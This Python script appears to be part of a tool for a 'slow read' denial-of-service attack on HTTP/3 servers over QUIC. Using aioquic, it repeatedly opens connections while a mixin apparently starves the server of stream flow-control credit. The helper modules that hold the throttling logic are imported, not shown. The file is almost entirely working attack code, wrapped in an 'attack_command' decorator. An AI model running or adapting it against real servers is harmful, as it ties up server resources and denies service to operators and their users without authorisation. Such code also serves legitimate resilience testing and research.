import logging
from aioquic.h3.connection import H3_ALPN
from aioquic_http3_client import HttpClient
from utils_slow_read import SlowReadMaxStreamDataMixin
from utils import attack_command, quic_connection_loop

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


class SlowReadHttpClient(SlowReadMaxStreamDataMixin, HttpClient):
    pass


@attack_command()
@quic_connection_loop(alpn_protocols=H3_ALPN, create_protocol=SlowReadHttpClient)
async def main(addr, con: HttpClient, debug=False, *args, **kwargs):
    if debug:
        con.max_stream_data_increment = 10
    res = await con.get(f'https://{addr[0]}:{addr[1]}/')
    logging.debug(f'Response: {res}')


if __name__ == '__main__':
    main()
